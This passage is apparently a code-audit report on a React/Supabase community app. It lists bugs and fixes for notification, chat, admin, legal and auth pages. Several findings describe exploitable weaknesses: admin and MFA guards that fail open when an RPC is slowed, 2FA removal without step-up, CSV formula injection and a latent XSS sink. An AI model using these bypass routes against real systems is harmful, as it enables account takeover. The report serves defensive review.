- **What breaks:** Verified: each toggle builds next from the closure-captured prefs (:134) and overwrites the entire notification_prefs column (:136-139). savingKey (:133) only drives a per-row spinner; it does not disable the other Switches. A member flipping two switches quickly: the second handler captures a prefs snapshot that may predate the first change, then writes the whole column — silently reverting the first toggle. Single JSON column, no per-key merge, last write wins. The error path also restores the stale closure prefs (:142).
- **Smallest fix:** Update a single key server-side (jsonb_set RPC or a per-preference row) instead of overwriting the whole blob, or serialize writes and re-read before merge.

### [Medium] navigate() is handed an untrusted data-driven link_url and mishandles external URLs  `error-handling` (CONFIRMED)
- **Where:** src/pages/NotificationsPage.tsx:156-159 (navigate(notif.link_url)), rendered under an ExternalLink 'View' button
- **What breaks:** Verified: link_url comes straight from notification rows (produced by ~140 edge functions) and is passed to react-router navigate() with no validation. An absolute value like 'https://discord.gg/...' is treated as an in-app path, producing a broken client route (blank/404) rather than opening the link — so any notification whose producer stored an absolute URL has a dead 'View' button (ironically labelled with an ExternalLink icon). There is no absolute-vs-relative branch and no fallback; it also opens a mild open-redirect-style surface if a producer is tricked into writing a crafted path.
- **Smallest fix:** Branch on absolute vs relative: window.open(url,'_blank','noopener') for external, navigate for internal; validate/allow-list the shape first.

### [Medium] Prerequisite fetch has no catch — page can hang on 'loading' forever plus unhandled rejection  `error-handling` (CONFIRMED)
- **Where:** src/pages/VolunteerTeamsPage.tsx:18-24 (JourneyService.getCompletedCount(...).then(...) with no .catch)
- **What breaks:** Verified: the effect calls getCompletedCount(...).then(setPrereqMet/setPrereqLoaded) with no .catch (:20-23). If it rejects (network, RLS, timeout), prereqLoaded never flips true, so GenericCoursePage stays gated on prerequisite.loaded=false indefinitely, and the rejection is an unhandled promise. The member is stuck with a spinner, no error, no retry — a failure path that neither recovers, retries, nor reports.
- **Smallest fix:** Add .catch that sets prereqLoaded(true) with a safe default and reports the error; prefer a React Query hook with built-in error state.

### [Medium] Report panels hand-roll CSV export, duplicated and with no field escaping (CSV/formula injection + column corruption)  `under-engineering` (CONFIRMED)
- **Where:** src/pages/community/MonthlyReportPanel.tsx:55-64 and src/pages/community/CategoryReportPanel.tsx:40-49
- **What breaks:** Verified: both panels contain the same Blob/anchor CSV writer, and neither escapes fields — the body is `${r.month},${r.status},${r.ticket_count}` / `${r.month},${r.category},${r.ticket_count}` interpolated raw. A status/category value containing a comma or newline shifts/corrupts columns, and a value beginning with =,+,-,@ becomes a live formula when opened in Excel/Sheets (CSV injection). Category labels are admin-editable (support_categories.label), so this is reachable. FeedbackPage in this same section already uses ThemedAgGrid which provides escaped export, so a safe shared path exists and is being bypassed.
- **Smallest fix:** Use the shared ThemedAgGrid/export utility or a single csv helper that quotes fields and neutralizes leading =,+,-,@; delete the duplicated inline writers.

### [Medium] createConversation succeeds but the unchecked user-message insert can leave an empty ghost conversation  `error-handling` (CONFIRMED)
- **Where:** src/pages/ChatPage.tsx:380-389 (send: createConversation then unchecked saveMessage)
- **What breaks:** Second-order partial-failure state: send() creates the conversation row first (:381), sets activeConvoId, then calls `if (convoId) await saveMessage(convoId, 'user', text)` (:389) whose inserts are unchecked. If the conversation insert succeeds but the message insert fails (RLS/network/row-size), a titled conversation row now exists and shows in the sidebar (loadConversations ran inside createConversation at :326) with zero messages — opening it renders a blank chat with no error. Likewise if streamChat throws after the user message saved but before onDone (:439-444), the turn is persisted half-written (user message, no answer). Neither state is detected, reported, or cleaned up.
- **Smallest fix:** Persist the turn in one transaction/edge call (conversation + first message atomically), check every insert result, and roll back / delete the empty conversation on message-insert failure.
- _added-in-verification_

### [Medium] Realtime handler invalidates the entire 'support' query prefix, amplifying the refetch storm across heavy report RPCs  `other` (CONFIRMED)
- **Where:** src/pages/community/GetHelpPage.tsx:197,200 (invalidateQueries({ queryKey: ['support'] })) vs the many ['support', ...] queries
- **What breaks:** The invalidation key is the bare prefix ['support'], which React Query matches as a prefix — so a single ticket event invalidates EVERY support query at once, not just the viewer's ticket list: the aggregation RPCs get_support_monthly_report (MonthlyReportPanel.tsx:27) and get_support_category_report (CategoryReportPanel.tsx:20), support_list_agents and support_categories (AdminAllTicketsGrid.tsx:37,52), and all freescout-proxied ticket lists. Every ticket event therefore refetches heavy monthly/category aggregations and the freescout proxy together, multiplying the storm described in the unfiltered-subscription finding well beyond a single list refetch.
- **Smallest fix:** Invalidate the narrowest key that changed (e.g. ['support','tickets', ...]); keep the report/agent/category queries on their own keys and refresh them on their own cadence, and debounce.
- _added-in-verification_

### [Low] React Query 'refresh' implemented by mutating the queryKey — unbounded cache growth  `under-engineering` (CONFIRMED)
- **Where:** src/pages/community/MonthlyReportPanel.tsx:24-34,81 and CategoryReportPanel.tsx:17-27,59 (refresh counter baked into queryKey)
- **What breaks:** Verified: the Refresh button increments a counter that is part of the queryKey (['support','monthly-report',_refresh] / ['support','category-report',refresh]), so each refresh creates a brand-new cache entry instead of refetching the existing one. With default gcTime these stale entries linger, leaking memory across a long admin session, and it misuses the library's built-in refetch/invalidate.
- **Smallest fix:** Drop the counter from the key; call the query's refetch() or queryClient.invalidateQueries on the button.

### [Low] Marketing opt-in state is a local mirror of an external system (Email Octopus) with a known drift window  `ownership` (PLAUSIBLE)
- **Where:** src/pages/NotificationSettingsPage.tsx:91-111 (get_my_marketing_subscription cached mirror + eo-contact-status live read) and :171-192
- **What breaks:** Verified in code: the displayed subscription is read from the cached mirror RPC (marketingOn = cached === 'subscribed', :100-101) and EO is read live ONLY when there is no local intent (:102-111). The code's own comments (:91-99, :171-173) acknowledge EO is the declared source of truth (ADR-0017), that the mirror lags a ~2-min cron, and that double opt-in leaves EO 'pending'. A member who unsubscribes directly in EO (or via an email link) still sees 'Subscribed' locally until the next sync — the two sources disagree during the window. Classic flag-mirroring-another-system; documented and partly mitigated, but the drift is real and user-visible.
- **Smallest fix:** Where correctness matters, read EO live or trigger a sync on load; at minimum surface a 'may take a couple minutes to reflect' hint tied to the actual sync.

### [Low] Feedback submit fires a Discord notification as an unawaited, uncaught promise  `error-handling` (CONFIRMED)
- **Where:** src/pages/FeedbackPage.tsx:41-43 (DiscordNotifyService.feedbackSubmitted(...) — not awaited, no catch)
- **What breaks:** Verified: the notification call is fire-and-forget with no .catch (:43). If it rejects (edge function down, network), it becomes an unhandled promise rejection. Non-critical to the member, but as written there is no recover/retry/report — a webhook outage is invisible to operators, so a run of missing feedback pings goes unnoticed.
- **Smallest fix:** Attach .catch that routes to the error reporter (info/warn); keep it non-blocking for the member.

### [Low] Member and admin feedback forms duplicate the same submit/validation logic  `under-engineering` (CONFIRMED)
- **Where:** src/pages/FeedbackPage.tsx:23-47 (FeedbackForm.handleSubmit) vs :143-164 (AdminFeedbackView.handleAdminSubmit)
- **What breaks:** Verified: area/message/submitting state, the canSubmit rule (message.trim().length >= 10), and the FeedbackService.submit call are implemented twice — FeedbackForm (:25-47) and the admin inline form (:144-164) are near-identical. They will drift: a validation or copy change made in one path silently won't apply to the other.
- **Smallest fix:** Extract one shared FeedbackFormFields + useFeedbackSubmit hook consumed by both the member page and the admin form/dialog.

### [Low] Direct table read (support_categories) and rpc from inside a page component  `boundary` (CONFIRMED)
- **Where:** src/pages/community/AdminAllTicketsGrid.tsx:35-47 (rpc support_list_agents), :50-66 (from('support_categories').select())
- **What breaks:** Verified: useAgents/useCategories are local useQuery hooks that reach the Supabase client directly from a page-level file (:39 rpc support_list_agents, :54-58 from('support_categories')), while the ticket calls in the very same file are routed through the lib helper invokeFreescout (:20). The support taxonomy read has no reusable owner, so the next surface needing categories/agents copies the query — the same boundary erosion as the other pages.
- **Smallest fix:** Move useAgents/useCategories into src/hooks backed by a support service; keep the page free of supabase.from/rpc.

### [Low] Reopened conversations lose feedback attribution and sources (turnId/sources not persisted)  `under-engineering` (CONFIRMED)
- **Where:** src/pages/ChatPage.tsx:246-257 (loadMessages selects only role, content) vs Msg carrying sources/turnId :37-42; feedback control :649
- **What breaks:** Verified: loadMessages selects only 'role, content' (:249) and casts straight to Msg[] (:255), while Msg carries sources and turnId (:37-42) and FleetyMessageFeedback consumes msg.turnId (:649). On reopening any not-brand-new conversation, every assistant message returns with turnId undefined and no sources, so 👍/👎 can't tie back to the answer and the source links vanish — silently degrading the documented learning-loop feature.
- **Smallest fix:** Persist and reload turn_id and sources on chat_messages (or hide the feedback control/source block for reloaded turns explicitly).

### [Low] Fragile single-boolean guard patched over the 'history disappeared' bug  `over-engineering` (CONFIRMED)
- **Where:** src/pages/ChatPage.tsx:215, 233-244, 383 (skipConvoReloadRef dance)
- **What breaks:** Verified: skipConvoReloadRef (:215) is a one-shot boolean set at :383 and consumed/reset in the activeConvoId effect (:238-242) to suppress the single reload that fires when a brand-new conversation is created mid-send — otherwise loadMessages would clobber the in-flight streamed answer. It is a patch over co-locating live streaming state with a DB-reload effect keyed on the same id: if two sends interleave or the effect fires in an unexpected order, one boolean is insufficient and the original clobber returns (race severity PLAUSIBLE).
- **Smallest fix:** Separate 'live in-flight turn' state from 'persisted conversation' state so opening/creating a conversation never races the stream; retire the ref.

---

## Admin, system-health, design, legal & consent pages

### [High] Legal 'Effective' date is a hardcoded literal that duplicates policy_versions.effective_at  `ownership` (CONFIRMED)
- **Where:** TermsPage.tsx:14 passes effective="May 7, 2026" to PolicyMarkdownView, which renders it verbatim (PolicyMarkdownView.tsx:83-84); PrivacyPage.tsx:81 and CookiesPage.tsx:117 inline 'Effective May 7, 2026'. Authoritative owner is policy_versions.effective_at, exposed by usePolicy (usePolicy.ts:13) and written at runtime by AdminPoliciesPage publish flow (AdminPoliciesPage.tsx:66, publish_policy_version RPC).
- **What breaks:** AdminPoliciesPage publishes a new Terms/Privacy version at runtime — new body_md AND new effective_at — with the explicit promise 'without redeploying' (AdminPoliciesPage.tsx:95). The body updates from the DB; the effective date shown to users is a compile-time string. After any publish the legal document body and its stated effective date silently disagree, and the drift is invisible until someone notices a misdated legal page in production. Two copies of one fact.
- **Smallest fix:** Delete the effective prop/literals and render the formatted policyQuery.data.effective_at from the same row that supplies body_md, so date and body share one owner.
- _first-pass_

### [High] SystemHealthPage: three tabs unreachable — allow-list omits 'reset', 'auth-funnel', 'edge-functions'  `under-engineering` (CONFIRMED)
- **Where:** SystemHealthPage.tsx: TabsTrigger for 'reset' (325), 'auth-funnel' (326), 'edge-functions' (335) exist; VALID_HEALTH_TABS (565-586) omits all three; SystemHealthTabs (588-606) forces value back to 'queues' when params.get('tab') fails the includes() check (591).
- **What breaks:** The Tabs value is derived solely from the URL param validated against VALID_HEALTH_TABS. Clicking 'Password reset', 'Auth funnel', or 'Edge functions' sets ?tab=reset (etc.), value recomputes, fails includes(), and snaps to 'queues'. ResetHealthTab, AuthFunnelTab, and EdgeFunctionsTab can never be opened. On the outage-triage dashboard, an admin trying to inspect password-reset or edge-function health during an incident is silently bounced to Queues.
- **Smallest fix:** Add the three keys to VALID_HEALTH_TABS, or derive the allow-list from the TabsTrigger set so the two lists cannot drift apart again.
- _first-pass_

### [High] ActivityLog severity/layer/search filters only apply to the current 50-row page  `boundary` (CONFIRMED)
- **Where:** ActivityLogPage.tsx: filteredEntries filters `entries` which is one page (383-410); server query fetches only PAGE_SIZE=50 via .range() (236-241, PAGE_SIZE=50 at 157); fetchLogs effect deps deliberately exclude search/severityFilter/layerFilter (378-381, deps=[page,eventFilter,dateFrom,dateTo]).
- **What breaks:** layerFilter, severityFilter and free-text search run client-side over only the 50 loaded rows but are presented as log-wide controls ('Failures, security events, and privileged actions across the platform', 523). An admin sets severity=Error, sees 1-2 matches on page 1, and concludes the platform had 1-2 errors while hundreds sit on unfetched later pages. trace:id lookups (532) only scan the current page, so an incident's event is silently missed. A correctness failure on the tool admins rely on to detect problems.
- **Smallest fix:** Push severity/layer/search into the server query (extend applyRangeFilters and add them to the fetchLogs effect deps) so filtering and pagination operate over the whole table.
- _first-pass_

### [Medium] Privacy/Cookies/Accessibility render a blank legal policy silently on fetch failure  `error-handling` (CONFIRMED)
- **Where:** PrivacyPage.tsx:68 `const md = policy?.body_md ?? ""` then 156 `<ReactMarkdown>{md}</ReactMarkdown>`; CookiesPage.tsx:99 & 182; AccessibilityPage.tsx:25 & 110. Contrast PolicyMarkdownView.tsx:104-117 which handles loading and error && !md.
- **What breaks:** These three pages hand-roll the markdown render and drop usePolicy's loading/error state. If usePolicy errors or is mid-flight, md is '' and ReactMarkdown renders nothing — no skeleton, no error, no retry. A visitor to /privacy during a DB/RPC hiccup sees the header and rights buttons but a completely empty privacy policy, with no indication anything failed and no toast/log. For a compliance page that must display current terms, silently showing an empty legal document is real regulatory exposure.
- **Smallest fix:** Route these three through PolicyMarkdownView, or copy its loading and `error && !md` branches so a failed/absent policy shows an error state instead of blank.
- _first-pass_

### [Medium] ActivityLog fetches the entire profiles table (every user's email) into the browser on every mount  `dependency` (CONFIRMED)
- **Where:** ActivityLogPage.tsx: fetchProfiles selects user_id,email,first_name,last_name,display_name from profiles with no filter or limit (201-205), called unconditionally on mount (374-376).
- **What breaks:** To label ~50 visible rows with actor names the page pulls every profile row — including every member's email — into client memory on each mount, and the payload grows linearly with membership. An unbounded query shipping all-member PII to the browser that only gets heavier as the network grows. It also reads the profiles table straight from the component, bypassing the hooks/services layer.
- **Smallest fix:** Resolve actor identity server-side (audit_log already carries actor_email) or fetch profiles only for the user_ids on the current page via .in('user_id', ids); move the read behind a hook/service.
- _first-pass_

### [Medium] ActivityLog CSV export can pull 250,000 rows client-side in serial 1k batches  `other` (CONFIRMED)
- **Where:** ActivityLogPage.tsx handleExportAll: while(true) loop issuing .range(from, from+999) sequentially, accumulating into `all`, cap at 250_000 (315-337), then stringifies and builds a Blob on the main thread (339-355).
- **What breaks:** Clicking 'Download CSV' on a busy audit_log issues up to 250 sequential PostgREST round-trips, holds every row plus the built CSV string in browser memory, and blocks the main thread while stringifying — freezing or crashing the admin's tab and hammering the DB. There is no server-side export and no size warning before it starts.
- **Smallest fix:** Move bulk export to an edge function that streams CSV, or gate the client export behind a hard row cap and a confirm when totalCount is large; at minimum free intermediate arrays.
- _first-pass_

### [Medium] UnsubscribePage reports transient/network failures as 'Invalid or expired link'  `error-handling` (CONFIRMED)
- **Where:** UnsubscribePage.tsx: validate() `catch { setState('invalid') }` (39-41) with no response.ok check (26-30, so a 500 returning any JSON also collapses to invalid); handleUnsubscribe `catch { setState('error') }` swallows the invoke error with no logging (56-58).
- **What breaks:** validate() collapses every failure — network drop, edge 500, JSON parse error — into state 'invalid', rendered as 'This unsubscribe link is no longer valid.' A user with a perfectly valid link who hits it during a transient outage is definitively told the link is dead and stops trying — a CAN-SPAM/GDPR opt-out control that appears broken exactly when the backend is flaky. Neither catch logs, so the failures are invisible to the Activity Log meant to catch them.
- **Smallest fix:** Check response.ok and distinguish transport/5xx errors (show a retryable state) from an authoritative invalid-token response; log the caught error via the client error pipeline instead of discarding it.
- _first-pass_

### [Medium] Admin pages read and write Supabase tables directly from components, bypassing hooks/services  `boundary` (CONFIRMED)
- **Where:** UserAdminPage.tsx:685 supabase.rpc('admin_set_test_account') inside an ag-grid cell renderer onClick; 138-158 direct reads of user_roles/admin_promotions/teacher_promotions; ActivityLogPage.tsx:202-203, 237-241, 285-288 direct profiles/audit_log/agent_fix_queue reads; AdminPoliciesPage.tsx:47-53 & 66 direct policy_versions read + RPC; HandoffAdminPage.tsx:46-49 direct projects read. decisions.md:10 states 'the UI never reaches past hooks/services to Supabase'; SystemHealthPage/BannerManagement use *.service.ts.
- **What breaks:** Half this section violates the stated UI→hooks→services→integrations shape, most starkly a data-mutating supabase.rpc call embedded in a table cell renderer (UserAdminPage:685) — untestable without rendering the grid, un-reusable, and mutating local state (690-694) with no refetch so a partial server failure leaves the grid disagreeing with the DB. Because the pattern is inconsistent (some pages use services, some don't), no single place owns 'list users' or 'read audit log', so the next agent copies the inline query and the drift compounds.
- **Smallest fix:** Lift these reads/writes into the service/hook layer (e.g. a UserAdminService.setTestAccount, an activity-log query hook) and have components call those, matching SystemHealthService/banner.service.
- _first-pass_

### [Medium] ActivityLog pagination uses the unfiltered server count while filtering is client-side  `other` (CONFIRMED)
- **Where:** ActivityLogPage.tsx: totalPages = ceil(totalCount/PAGE_SIZE) (439); totalCount comes from audit_log_count_fast which takes only event_type/date args, ignoring layer/severity/search (249-262, 271-280); pager driven by totalPages (649-663).
- **What breaks:** When an admin applies a layer/severity filter or text search (all client-side over the current page), totalCount and the page count still reflect the unfiltered table. The pager shows e.g. 'Page 1 of 40' but Next/Prev walk pages that are mostly empty after client filtering — the admin clicks through blank pages, reinforcing the false conclusion that few matching events exist. The '~N events' badge (604) is also unrelated to what is displayed.
- **Smallest fix:** Once filters are server-side, have audit_log_count_fast take the same filter args so count and pager match the rendered result set.
- _first-pass_

### [Medium] ActivityLog fetchProfiles has no error handling — a timeout becomes an unhandled rejection and actors silently show as raw UUIDs  `error-handling` (CONFIRMED)
- **Where:** ActivityLogPage.tsx:201-216 — fetchProfiles awaits withTimeout(...) with no try/catch and ignores the query's `error` field (only destructures `data`); called bare at 374-376 (`useEffect(() => { fetchProfiles(); }, [])`, no .catch).
- **What breaks:** withTimeout rejects after 15s (44-56); fetchProfiles neither catches it nor is caught by the caller, so a slow/failed profiles query throws an unhandled promise rejection and leaves the profiles map empty. Every Actor Email cell then falls back to the raw user_id UUID (458) with no error surfaced — during an incident the admin reads an audit log where actors are unidentifiable and nothing indicates the lookup failed. Contrast fetchLogs, which is wrapped in try/catch with a visible error state.
- **Smallest fix:** Wrap fetchProfiles in try/catch, check the returned error, and surface a non-blocking toast/state when identity resolution fails instead of silently degrading to UUIDs.
- _added-in-verification_

### [Medium] CSV export ignores the active layer/severity/search filters, exporting a different set than the admin sees  `other` (CONFIRMED)
- **Where:** ActivityLogPage.tsx handleExportAll applies only applyRangeFilters (event_type + date, 323-329) — it does NOT apply layerFilter, severityFilter, or the search box, which live only in the client-side filteredEntries (383-410). The button is labeled 'Download CSV ({totalCount})' (616).
- **What breaks:** An admin narrows the on-screen log to severity=Error (or a trace:id search) and clicks Download CSV expecting the filtered rows; the export instead dumps every event in the date range, silently ignoring severity/layer/search. The exported file contradicts what the admin was looking at, and the '(N)' count label reinforces the illusion the export is scoped. During triage this hands the investigator a haystack when they asked for the needle — and quietly widens the PII/data footprint of the export.
- **Smallest fix:** Once layer/severity/search are server-side (see the client-filter finding), apply the same predicates in handleExportAll so the export matches the rendered, labeled result set.
- _added-in-verification_

### [Medium] Pagination bounds are computed from a planner ESTIMATE, making real rows unreachable at scale  `other` (PLAUSIBLE)
- **Where:** ActivityLogPage.tsx: when unfiltered, totalCount is audit_log_count_fast's O(1) planner estimate and countEstimated is set true (273-274, 248 comment); totalPages = ceil(totalCount/PAGE_SIZE) (439); the Next button is disabled at `page >= totalPages - 1` (658).
- **What breaks:** The pager treats an estimate as an exact bound. If the estimate under-counts (planner estimates drift low on churny tables), totalPages is too small and Next is disabled before the admin reaches the real last page — recent audit rows become unreachable through the UI. If it over-counts, Next walks onto pages whose server query returns [] and the grid shows an empty page mid-range. Either way the highest-privilege diagnostic log cannot be reliably paged to its end.
- **Smallest fix:** Drive pagination from a hasMore signal (rows.length === PAGE_SIZE) rather than ceil(estimate); reserve the estimate for the '~N' badge only, and label the pager as approximate when countEstimated is true.
- _added-in-verification_

### [Medium] Direct reads of profiles/audit_log lean entirely on RLS while the only visible gate is the client-side AdminRoute  `security` (PLAUSIBLE)
- **Where:** ActivityLogPage.tsx reads profiles (all rows+emails, 201-205), audit_log (237-241) and agent_fix_queue (285-288) directly; the only access control cited is comments 'Admin access is enforced by AdminRoute wrapper' (165, 516) and 'admin-only by RLS' (282). UserAdminPage similarly reads user_roles/admin_promotions directly (138-158).
- **What breaks:** AdminRoute is a client-side route guard — it hides the page, it does not gate the queries, which run with the visitor's own Supabase JWT. Security therefore rests solely on the RLS policies of profiles/audit_log/agent_fix_queue/user_roles. profiles tables commonly ship with a permissive 'authenticated can select' policy for public display names; if that is the case here, any logged-in member (not just an admin) can replay these exact selects and pull every member's email and the full security audit log. The code gives no server-side authorization of its own to fall back on.
- **Smallest fix:** Confirm each of these tables has an admin-only SELECT RLS policy (or route the reads through a SECURITY DEFINER RPC / edge function that checks the admin role server-side); do not rely on AdminRoute for data authorization.
- _added-in-verification_

### [Low] Teacher promote/revoke skip the step-up 2FA required for admin promote/delete  `security` (CONFIRMED)
- **Where:** UserAdminPage.tsx: handlePromoteTeacher (321-347), handleResendTeacher (353-379), handleRevokeTeacher (381-405) call supabase.functions.invoke directly; only handlePromote (219/224), handleResendInvite (253/258), handleDeleteUser (287/292) go through invokeWithStepUp (109-125).
- **What breaks:** Promoting to admin and purging accounts require a fresh TOTP proof, but granting or REVOKING the teacher role — a privilege change controlling who authors classes and reaches member-facing teaching surfaces — has no client step-up. If an admin session is hijacked (XSS, unlocked machine), an attacker can silently revoke every teacher or self-promote proxies to teacher without the 2FA friction applied to the admin path. The client gate is inconsistent for comparable privilege mutations.
- **Smallest fix:** Route revoke/promote/resend-teacher through invokeWithStepUp too, or confirm and document that revoke-teacher-role/promote-to-teacher enforce step-up server-side so the client asymmetry is intentional.
- _first-pass_

### [Low] ActivityLog triage cell renders an HTML string interpolating a DB value via innerHTML  `security` (PLAUSIBLE)
- **Where:** ActivityLogPage.tsx:502-512 — the Triage column cellRenderer returns a raw HTML string `<span class="…${tone}">${v}</span>` where v is the valueGetter output (495-501) = triageMap value derived from agent_fix_queue.status (291-296).
- **What breaks:** An ag-grid cellRenderer returning a string is injected as innerHTML. The tone classes are fixed, but ${v} is the agent_fix_queue.status value. If that column is ever free-text or automated-agent-written from error content rather than a strict enum, this is stored XSS executing in an admin's authenticated session on the highest-privilege page. Even if currently enum-constrained it is a latent injection sink one schema change away from exploitable.
- **Smallest fix:** Return a JSX element instead of an HTML string, or escape v; never build innerHTML from a DB column.
- _first-pass_

### [Low] BrandTokensPage hardcodes hex values that duplicate the real theme tokens  `ownership` (CONFIRMED)
- **Where:** BrandTokensPage.tsx:9-19 — COLORS array lists literal hex '#0056A7' etc. each mapped to a CSS token name (--primary and friends); rendered as swatches at 44-53.
- **What breaks:** This 'what's currently shipped' reference (38) swatches literal hex alongside token names, but the tokens' real values live in the theme CSS. The page is a second copy of the palette with no link to the first, so when a token value changes the reference silently shows the old color and lies to the designers using it to verify what shipped — the opposite of its stated purpose. Admin-only, hence low.
- **Smallest fix:** Read the computed CSS custom-property values via getComputedStyle(:root) and render those, so the page reflects live tokens instead of a frozen duplicate.
- _first-pass_

### [Low] Deliverability smoke test uses a timestamped idempotency key, so retries re-send every template  `other` (CONFIRMED)
- **Where:** AdminEmailDeliverabilityTestPage.tsx:111 — idempotencyKey: `deliv-test-${t.name}-${Date.now()}` inside the per-template send loop (104-114).
- **What breaks:** The idempotencyKey exists to dedupe a send; keying it on Date.now() makes every invocation unique, so re-running the test or a double click enqueues a fresh copy of all 9 templates to the target mailbox each time, and any client retry defeats send-transactional-email's dedupe. Low impact (admin-controlled mailbox) but it silently undermines the guarantee it appears to use.
- **Smallest fix:** Key on a stable run identifier (one runId per button press, or template+recipient+run) rather than per-template Date.now().
- _first-pass_

---

## Auth, MFA & route-guard components

### [High] AdminRoute fails OPEN on 2FA-grace RPC timeout — full admin surface renders with no gate  `error-handling` (CONFIRMED)
- **Where:** src/components/AdminRoute.tsx:53-66,101-152
- **What breaks:** On RPC_TIMEOUT the code sets graceActive=null and deadline=null (lines 64-65) and only reportError()s. The lockout branch needs graceActive===false (101) and the banner needs ===true (124); both are skipped, so execution falls to `return <>{children}</>` (152). An admin with NO verified TOTP who is past the grace deadline — or an attacker throttling admin_2fa_grace_active/deadline (8s timeout, one retry) — renders the entire admin UI. Since this is the only client gate and there is no route-level server AAL2 check, slowing one RPC deletes enforcement.
- **Smallest fix:** On RPC_TIMEOUT fail CLOSED for the lockout decision: treat unknown grace as not-active (show setup/lockout) or hold the spinner and retry; only reportError should be best-effort.

### [High] MfaEnforcementGuard fails OPEN when listFactors flakes — AAL1 user with verified TOTP is never challenged  `error-handling` (CONFIRMED)
- **Where:** src/components/MfaEnforcementGuard.tsx:62-72 + src/services/mfa.service.ts:160-168,181
- **What breaks:** getMfaGateDecision() catches ANY listFactors failure and returns {hasVerifiedTotp:false, needsChallenge:false} (167). The comment says 'failing closed' but the effect is fail-OPEN: needsChallenge:false means no challenge. The guard's own catch (68-69) also just log.warns 'non-blocking'. A user who HAS a verified TOTP factor but whose session is AAL1 proceeds fully authenticated whenever listFactors transiently errors (rate-limit, 5xx, GoTrue Web-Lock contention). One induced failed factor-list call bypasses MFA enforcement.
- **Smallest fix:** On listFactors failure inside getMfaGateDecision, distinguish 'no factor' (safe to skip) from 'could not determine' (must block/prompt or sign out); never return needsChallenge:false on an error.

### [High] TotpMfaManagement re-auths with signInWithPassword in a component — frozen-auth violation that silently downgrades AAL2  `security` (CONFIRMED)
- **Where:** src/components/TotpMfaManagement.tsx:142-158
- **What breaks:** A UI component calls supabase.auth.signInWithPassword directly (144) to 're-auth' before disabling 2FA — bypassing the auth service/feature and the no-direct-auth-mutations allowlist (GoogleSignInButton documents itself as the single sanctioned auth entrypoint). signInWithPassword mints a BRAND-NEW AAL1 session: it downgrades an admin who was AAL2, rotates tokens, and fires SIGNED_IN, which MfaEnforcementGuard's onAuthStateChange handler catches and races into popping the challenge dialog mid-disable (factors not yet removed → needsChallenge still true). The comment claims scope:'local' but no scope argument is passed at all — the comment is false. Full sign-in is the wrong primitive for a reauth confirmation.
- **Smallest fix:** Move reauth+disable into MfaService/auth feature; use a real reauthenticate/step-up TOTP flow (StepUpMfaDialog) instead of signInWithPassword; never full-login to confirm identity.

### [High] Single 2FA factor removal has NO step-up but 'Disable all' requires a password — hijacked session strips 2FA via trash icon  `security` (CONFIRMED)
- **Where:** src/components/TotpMfaManagement.tsx:98-107 (handleRemove) vs 131-169 (handleDisableAll)
- **What breaks:** handleRemove deletes a verified TOTP factor behind only a native confirm() (99) — no password, no step-up — while handleDisableAll demands a password (144). An open/kiosk session or an XSS-adjacent foothold can silently remove the last authenticator through the per-factor trash button (241), defeating MFA, and drop the user to AAL1 with no further prompt. Two paths reach the identical security-critical outcome (no more 2FA) with wildly different gates.
- **Smallest fix:** Require the same re-auth/step-up (StepUpMfaDialog or password) for removing any verified factor as for disable-all; replace native confirm().

### [High] ProgressCacheIdentityGuard clears only ~13 hand-listed keys — every other user-scoped cache survives an identity switch  `ownership` (CONFIRMED)
- **Where:** src/components/ProgressCacheIdentityGuard.tsx:22-59
- **What breaks:** On identity change the guard removeQueries() only for the hardcoded PROGRESS_QUERY_KEYS list (22-36,51-52). Profile, PII, submissions, roles, notifications, and every other user-scoped React Query entry are left intact. On a shared device (user A signs out, user B signs in without a full reload) or an OAuth account bounce, user B can render user A's cached profile/PII from the untouched keys. It patches a symptom (progress display) instead of the root cause (clear all user-scoped cache on identity transition) and forces every future hook author to append its key here — a mistyped/missing key silently reintroduces cross-identity bleed.
- **Smallest fix:** On identity change clear the whole per-user cache (qc.clear() or remove all queries scoped to the old user id) at the auth layer, not a curated string list in one component.

### [Medium] Grace-check workflow duplicated across AdminRoute and AdminTwoFactorGraceDialog with divergent, already-disagreeing failure semantics  `boundary` (CONFIRMED)
- **Where:** src/components/AdminRoute.tsx:42-66 vs src/components/AdminTwoFactorGraceDialog.tsx:56-84
- **What breaks:** Both components independently run the same three-call fetch (hasVerifiedTotp + admin_2fa_grace_active + admin_2fa_grace_deadline) and interpret timeouts oppositely: AdminRoute fails OPEN (renders children, 55-66), the dialog keeps last-known state (67-78). Two copies of one security decision that already disagree — the route can admit an admin while the nag modal shows/hides on different data, so banner/lockout and modal contradict each other on the same page. Any change to the grace rule must be made twice or they drift further.
- **Smallest fix:** Extract one useAdmin2faGrace() hook/service owning the fetch + timeout policy; both components consume it so there is a single owner and one failure semantics.

### [Medium] UI components hard-code named DB RPCs (admin_2fa_grace_active/deadline), bypassing the service layer  `dependency` (CONFIRMED)
- **Where:** src/components/AdminRoute.tsx:46-47 and src/components/AdminTwoFactorGraceDialog.tsx:62-64
- **What breaks:** Both components call rpcWithTimeout<...>('admin_2fa_grace_active'/'admin_2fa_grace_deadline', {_user_id}) — a view-layer component hard-coding DB function names and their argument shape, violating UI→hooks→services→lib layering. On rename/re-signature, breakage scatters across components with no service seam to catch it, and the DB contract is duplicated in the view.
- **Smallest fix:** Wrap these RPCs behind a service method (e.g. Admin2faService.getGrace(userId)); components call the service, not raw RPC names.

### [Medium] IdleTimeoutGuard bakes the 60-minute session policy into React and uses the throwing signOut with no try/catch  `boundary` (CONFIRMED)
- **Where:** src/components/IdleTimeoutGuard.tsx:18,22,24-32,38-44
- **What breaks:** timeoutMinutes=60 and warningMs=2min are hardcoded in the component (22,40) — a second source of truth alongside the GoTrue/Supabase-dashboard session timeout (per project memory those live in the dashboard), which can silently disagree with this timer. handleTimeout does `await signOut()` using the context signOut (18), not the never-throwing signOutSafe used elsewhere, with NO try/catch — if signOut rejects, navigate('/login') never runs (31) and the idled user is left on the page looking authenticated.
- **Smallest fix:** Source the idle policy from one config owner; route sign-out through signOutSafe or wrap in try/finally so the redirect always runs.

### [Medium] MfaChallengeDialog turns a transient listFactors failure into a non-dismissible 'contact support' lockout that forces sign-out  `error-handling` (CONFIRMED)
- **Where:** src/components/MfaChallengeDialog.tsx:44-51,95-96,121 (and StepUpMfaDialog.tsx:35-42,76 less severely)
